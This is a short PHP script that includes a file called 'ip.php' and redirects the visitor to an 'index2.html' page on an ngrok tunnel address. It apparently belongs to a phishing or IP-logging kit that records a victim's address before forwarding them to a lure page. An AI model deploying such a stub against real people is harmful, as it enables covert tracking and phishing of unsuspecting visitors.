<?php
include 'ip.php';
header('Location: https://72fc03e6d2d6.ngrok.io/index2.html');
exit
?>
